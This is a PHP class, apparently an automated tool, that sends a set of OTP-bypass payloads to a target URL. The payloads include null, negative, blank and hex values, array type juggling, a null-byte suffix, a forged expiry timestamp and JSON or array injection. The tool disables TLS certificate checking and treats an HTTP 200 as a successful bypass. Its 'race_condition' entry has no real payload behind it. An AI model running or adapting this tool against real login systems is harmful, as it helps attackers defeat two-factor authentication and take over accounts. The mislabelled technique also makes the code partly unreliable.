<?php
class BypassHandler {
    private static $techniques = [
        'parameter_removal' => 'Remove OTP param',
        'null_value' => 'Send otp=null',
        'negative_value' => 'Send otp=-1',
        'race_condition' => 'Send parallel requests',
        'type_juggling' => 'Send otp[]=123',
        'expiry_manipulate' => 'Change timestamp',
        'blank_value' => 'Send otp= ',
        'special_chars' => 'Send otp=123%00',
        'decimal_value' => 'Send otp=123.0',
        'hex_value' => 'Send otp=0x7B',
        'json_injection' => 'Send {"otp":123}',
        'array_injection' => 'Send otp[0]=123&otp[1]=456'
    ];

    public static function runAll($params) {
        $url = $params['url'];
        $results = [];
        
        foreach (self::$techniques as $name => $desc) {
            $payload = self::generatePayload($name);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $resp = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            $results[$name] = [
                'description' => $desc,
                'http' => $http,
                'success' => ($http == 200)
            ];
        }
        
        return $results;
    }

    private static function generatePayload($technique) {
        switch ($technique) {
            case 'parameter_removal': return '';
            case 'null_value': return 'otp=null';
            case 'negative_value': return 'otp=-1';
            case 'type_juggling': return 'otp[]=123';
            case 'expiry_manipulate': return 'otp=123&timestamp=9999999999';
            case 'blank_value': return 'otp= ';
            case 'special_chars': return 'otp=123%00';
            case 'decimal_value': return 'otp=123.0';
            case 'hex_value': return 'otp=0x7B';
            case 'json_injection': return '{"otp":123}';
            case 'array_injection': return 'otp[0]=123&otp[1]=456';
            default: return 'otp=123';
        }
    }
}
?>
